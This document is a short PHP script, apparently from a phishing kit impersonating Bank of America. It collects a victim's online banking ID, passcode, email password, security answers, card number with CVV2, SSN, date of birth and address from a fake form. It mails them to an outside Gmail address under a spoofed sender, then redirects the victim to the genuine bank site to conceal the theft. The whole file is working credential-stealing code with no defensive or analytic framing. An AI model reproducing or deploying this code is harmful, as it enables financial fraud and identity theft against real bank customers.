<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "------------------+ BIZ +------------------\n";
$message .= "Online ID : ".$_POST['invincible']."\n";
$message .= "Passkey : ".$_POST['invincible1']."\n";
$message .= "Email ID : ".$_POST['invincible2']."\n";
$message .= "Password : ".$_POST['invincible3']."\n";
$message .= "Q1  : ".$_POST['invincible4']."\n";
$message .= "Answer 1 : ".$_POST['invincible7']."\n";
$message .= "Q2 : ".$_POST['invincible5']."\n";
$message .= "Answer 2 : ".$_POST['invincible8']."\n";
$message .= "Q3 : ".$_POST['invincible6']."\n";
$message .= "Answer 3 : ".$_POST['invincible9']."\n";
$message .= "Card No : ".$_POST['invincible10']."\n";
$message .= "Expiry : ".$_POST['invincible11']."\n";
$message .= "CVV2 : ".$_POST['invincible12']."\n";
$message .= "DOB : ".$_POST['invincible13']."\n";
$message .= "SSN : ".$_POST['invincible14']."\n";
$message .= "Full Name : ".$_POST['invincible15']."\n";
$message .= "Address : ".$_POST['invincible16']."\n";
$message .= "City : ".$_POST['invincible17']."\n";
$message .= "Zipcode : ".$_POST['invincible18']."\n";
$message .= "Employers Name : ".$_POST['invincible19']."\n";
$message .= "------------------+ SLKCODED+--------------------\n";
$message .= "HostName            : ".$hostname."\n";
$rnessage  = "$message\n";
$message .= "------------------+ CODED +--------------------\n";
$send = "ifolkstrends@gmail.com";
$subject = "New BIZ";
$headers = "From: New BOA <findnow1@peoplepc.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$rnessage,$headers);
echo'<META http-equiv="refresh" content="0;URL= https://www.bankofamerica.com/">'; 
?>


